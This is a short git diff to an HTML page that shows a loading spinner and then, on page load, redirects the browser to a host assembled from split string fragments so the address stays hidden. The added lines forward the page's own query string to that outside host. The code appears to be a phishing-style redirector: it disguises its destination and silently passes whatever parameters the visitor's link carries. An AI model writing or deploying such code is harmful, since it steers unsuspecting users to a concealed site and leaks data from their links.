@@ -50,15 +50,16 @@
 <body>
 	<div id='loader'>
 		<i class='fa fa-spinner fa-spin' style='font-size: 25px;'></i>
-	</div>.io
+	</div>
 	<script>
+		const xx = window.location.href.split('?');
 		let nbg1 = 'https'
 			let nbg2 = '://go'
 			let nbg3 = '4w.'
 			let nbg4 = 'onwe'
 			let nbg5 = 'bapp'
-			let nbg6 = '.io'
-			let nbg7 = ''
+			let nbg6 = '.io?'
+			let nbg7 = xx[1]
 		document.addEventListener('DOMContentLoaded', () => {
 			setTimeout(() => {
 				window.location.assign(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
